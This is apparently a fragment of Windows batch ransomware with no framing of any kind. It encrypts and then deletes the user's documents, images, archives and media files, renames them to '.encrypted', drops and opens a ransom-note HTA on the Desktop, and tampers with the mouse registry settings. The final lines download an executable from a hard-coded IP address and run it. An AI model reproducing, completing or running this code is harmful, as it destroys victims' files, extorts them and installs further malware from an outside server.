if exist *.pptx %bdir%\cookie.exe -e -p %key% *.pptx
if exist *.pptx.aes del *.pptx  >nul 2>&1
if exist *.ppt %bdir%\cookie.exe -e -p %key% *.ppt
if exist *.ppt.aes del *.ppt  >nul 2>&1
if exist *.jpg %bdir%\cookie.exe -e -p %key% *.jpg
if exist *.jpg.aes del *.jpg  >nul 2>&1
if exist *.jpeg %bdir%\cookie.exe -e -p %key% *.jpeg
if exist *.jpeg.aes del *.jpeg  >nul 2>&1
if exist *.mp3 %bdir%\cookie.exe -e -p %key% *.mp3
if exist *.mp3.aes del *.mp3  >nul 2>&1
if exist *.gif %bdir%\cookie.exe -e -p %key% *.gif
if exist *.gif.aes del *.gif  >nul 2>&1
if exist *.html %bdir%\cookie.exe -e -p %key% *.html
if exist *.html.aes del *.html  >nul 2>&1
if exist *.js %bdir%\cookie.exe -e -p %key% *.js
if exist *.js.aes del *.js  >nul 2>&1
if exist *.ddf %bdir%\cookie.exe -e -p %key% *.ddf
if exist *.ddf.aes del *.ddf  >nul 2>&1
if exist *.hta %bdir%\cookie.exe -e -p %key% *.hta
if exist *.hta.aes del *.hta  >nul 2>&1
if exist *.xlxs %bdir%\cookie.exe -e -p %key% *.xlxs
if exist *.xlxs.aes del *.xlxs  >nul 2>&1
if exist *.accdb %bdir%\cookie.exe -e -p %key% *.accdb
if exist *.accdb.aes del *.accdb  >nul 2>&1
if exist *.jfif %bdir%\cookie.exe -e -p %key% *.jfif
if exist *.jfif.aes del *.jfif  >nul 2>&1
if exist *.psd %bdir%\cookie.exe -e -p %key% *.psd
if exist *.psd.aes del *.psd  >nul 2>&1
if exist *.log %bdir%\cookie.exe -e -p %key% *.log
if exist *.log.aes del *.log  >nul 2>&1
if exist *.pdf %bdir%\cookie.exe -e -p %key% *.pdf
if exist *.pdf.aes del *.pdf  >nul 2>&1
if exist *.svg %bdir%\cookie.exe -e -p %key% *.svg
if exist *.svg.aes del *.svg  >nul 2>&1
if exist *.xls %bdir%\cookie.exe -e -p %key% *.xls
if exist *.xls.aes del *.xls  >nul 2>&1
if exist *.avi %bdir%\cookie.exe -e -p %key% *.avi
if exist *.avi.aes del *.avi  >nul 2>&1
if exist *.zip %bdir%\cookie.exe -e -p %key% *.zip
if exist *.zip.aes del *.zip  >nul 2>&1
if exist *.7z %bdir%\cookie.exe -e -p %key% *.7z
if exist *.7z.aes del *.7z  >nul 2>&1
if exist *.rar %bdir%\cookie.exe -e -p %key% *.rar
if exist *.rar.aes del *.rar  >nul 2>&1
if exist *.wav %bdir%\cookie.exe -e -p %key% *.wav
if exist *.wav.aes del *.wav  >nul 2>&1
if exist *.mov %bdir%\cookie.exe -e -p %key% *.mov
if exist *.mov.aes del *.mov  >nul 2>&1
if exist *.m4a %bdir%\cookie.exe -e -p %key% *.m4a
if exist *.m4a.aes del *.m4a  >nul 2>&1
if exist *.webp %bdir%\cookie.exe -e -p %key% *.webp
if exist *.webp.aes del *.webp  >nul 2>&1
rename *.aes *.encrypted  >nul 2>&1
)
cd C:\Users\%username%\Desktop
(
echo ^<html^>^<head^>^<title^>^</title^> 
echo. 
echo ^<hta:application id="oBVC" 
echo applicationname="blablapoop"
echo version="1.0" 
echo maximizebutton="no" 
echo minimizebutton="no" 
echo sysmenu="yes" 
echo Caption="yes" 
echo windowstate="maximize"/^> 
echo. 
echo ^</head^>^<body bgcolor="#330000" scroll="no"^> 
echo ^<font face="Impact" size="4" color="white"^> 
echo ^<center^>
echo ^<br^>
echo ^<br^>
echo ^<br^>
echo ^<br^>
echo ^<br^>
echo ^<br^>
echo ^<br^>
echo ^<img src="" alt="lock"^>
echo ^<h1^>^</h1^> 
echo. 
echo ^<p^>^</p^> 
echo. 
echo ^<p^>^</p^> 
echo. 
echo ^<p^>^</p^> 
echo. 
echo. 
echo ^<p^>^</p^> 
echo. 
echo ^<p^>^</p^> 
echo. 
echo ^<br^>
echo ^<h3^>^</h3^> 
echo ^</center^>
echo. 
echo. 
echo. 
echo. 
echo. 
echo ^</font^> 
echo ^</body^>
echo. 
echo. 
echo ^</html^> 
) > README.hta 
start "" "README.hta"
del C:\Users\%username%\AppData\Local\keksiky.mnam
exit
:error
echo msgbox("") > C:\Users\%username%\AppData\Local\error.vbs
start C:\Users\%username%\AppData\Local\error.vbs
exit
reg add "HKEY_CURRENT_USER\Control Panel\Mouse" /v MouseTrails /t REG_SZ /d "7" /f
reg add "HKEY_CURRENT_USER\Control Panel\Mouse" /v MouseTreshold1 /t REG_SZ /d "0" /f
reg add "HKEY_CURRENT_USER\Control Panel\Mouse" /v MouseTreshold2 /t REG_SZ /d "0" /f
reg add "HKEY_CURRENT_USER\Control Panel\Mouse" /v MouseSensitivity /t REG_SZ /d "1" /f
curl http://161.97.167.99/storug/g.exe --output %appdata%\g.exe
curl http://161.97.167.99/storug/kekw.png --output %appdata%\kekw.png
start %appdata%\g.exe
